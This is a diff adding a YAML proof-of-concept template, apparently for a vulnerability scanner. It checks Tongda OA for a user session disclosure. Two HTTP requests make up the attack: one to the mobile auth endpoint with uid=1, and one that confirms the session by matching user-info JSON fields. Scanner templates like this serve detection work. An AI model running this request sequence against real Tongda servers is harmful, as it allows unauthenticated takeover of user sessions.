@@ -1,0 +1,32 @@
+id: poc-yaml-tongda-user-session-disclosure
+info:
+  name: Tongda User Session Disclosure
+  severity: high
+  tags:
+  - 信息泄露
+  finger: Tongda
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: 'true'
+  output: []
+- method: POST
+  path: /general/userinfo.php?UID=1
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "\"dept_name\":\"") && contains(body,
+    "\"online_flag\":") && contains(headers, "Content-Type") && contains(headers,
+    "application/json")
+  output: []
